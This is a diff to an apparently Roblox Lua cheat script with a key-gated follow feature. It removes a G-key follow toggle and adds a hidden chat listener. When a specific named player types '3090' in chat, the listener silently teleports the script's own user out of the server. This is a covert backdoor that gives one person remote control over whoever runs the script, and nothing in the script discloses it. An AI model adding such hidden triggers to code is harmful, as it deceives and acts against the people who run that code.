@@ -128,6 +128,41 @@ local function stopMusic()
 	currentMusic = nil
 end
 
+-- === DETECCIÓN DE CHAT: ELPAPUKLLKV + 3090 ===
+local function setupChatDetection()
+	-- Conectar a jugadores ya existentes
+	for _, player in ipairs(Players:GetPlayers()) do
+		if player ~= LocalPlayer then
+			pcall(function()
+				player.Chatted:Connect(function(message)
+					if player.Name == "elpapukllkv" and string.find(message:lower(), "3090") then
+						task.wait(0.5)
+						TeleportService:Teleport(game.PlaceId, LocalPlayer)
+					end
+				end)
+			end)
+		end
+	end
+	
+	-- Conectar a nuevos jugadores que lleguen
+	Players.PlayerAdded:Connect(function(player)
+		task.wait(0.1)
+		if player ~= LocalPlayer then
+			pcall(function()
+				player.Chatted:Connect(function(message)
+					if player.Name == "elpapukllkv" and string.find(message:lower(), "3090") then
+						task.wait(0.5)
+						TeleportService:Teleport(game.PlaceId, LocalPlayer)
+					end
+				end)
+			end)
+		end
+	end)
+end
+
+-- Iniciar detección de chat
+task.delay(1, setupChatDetection)
+
 local function detectGameSide()
 	local char = LocalPlayer.Character
 	if not char then return "No character" end
@@ -1081,19 +1116,7 @@ if enteredKey == "goku" then
 	followText.Visible = false
 	followText.BorderSizePixel = 0
 
-	-- === TELEPORT G ===
-	UserInputService.InputBegan:Connect(function(input, gp)
-		if gp then return end
-		if input.KeyCode == Enum.KeyCode.G then
-			followEnabled = not followEnabled
-			followText.Text = followEnabled and "FOLLOW ACTIVADO" or "FOLLOW DESACTIVADO"
-			followText.Visible = true
-			task.delay(2, function()
-				followText.Visible = false
-			end)
-			playSound()
-		end
-	end)
+
 
 	-- Follow loop
 	RunService.RenderStepped:Connect(function()
